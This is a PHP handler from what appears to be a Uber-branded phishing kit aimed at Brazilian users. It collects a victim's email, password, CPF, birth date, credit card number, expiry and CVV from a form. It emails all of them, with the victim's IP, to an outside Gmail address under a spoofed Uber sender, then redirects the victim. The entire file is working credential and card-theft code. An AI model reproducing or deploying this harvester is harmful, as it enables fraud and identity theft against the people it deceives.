<?php

session_start();

 $email = $_POST['email'];
 $senha = $_POST['senha'];
 $nome = $_POST['nome'];
 $cpf = $_POST['cpf'];
 $nascimento = $_POST['nascimento'];
 $cc = $_POST['cc'];
 $validade = $_POST['validade'];
 $cvv = $_POST['cvv'];

$_SESSION["email"] = $email;
$_SESSION["senha"] = $senha;
$_SESSION["nome"] = $nome;
$_SESSION["cpf"] = $cpf;
$_SESSION["nascimento"] = $nascimento;
$_SESSION["cc"] = $cc;
$_SESSION["validade"] = $validade;
$_SESSION["cvv"] = $cvv;


$ip = $_SERVER['REMOTE_ADDR'];


$emaildestinatario = 'amaralthi09@gmail.com';

$subj = "Dados / IP: $ip - Chegou: Uber";


$mensagemHTML = '
<p>------------- |Chegou Uber | ------------</p>
<p><b>email:</b> '.$email.'<br>
<p><b>senha:</b> '.$senha.'<br>
<br>
<p><b>Nome:</b> '.$nome.'<br>
<p><b>CPF:</b> '.$cpf.'<br>
<p><b>nascimento:</b> '.$nascimento.'<br>
<br>
<p><b>CC:</b> '.$cc.'<br>
<p><b>validade:</b> '.$validade.'<br>
<p><b>CVV:</b> '.$cvv.'<br>
<br>

<p>---------------- |BY MK| -------------------</p>

';

$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: recadastramento@uber.com.br \r\n";
$headers .= "Return-Path: recadastramento@uber.com.br \r\n";
$envio = mail("amaralthi09@gmail.com", $subj, $mensagemHTML, $headers);

if($envio){
	echo "<script>location='../fim.php';</script>";
}else{ 
	echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>";
}

?>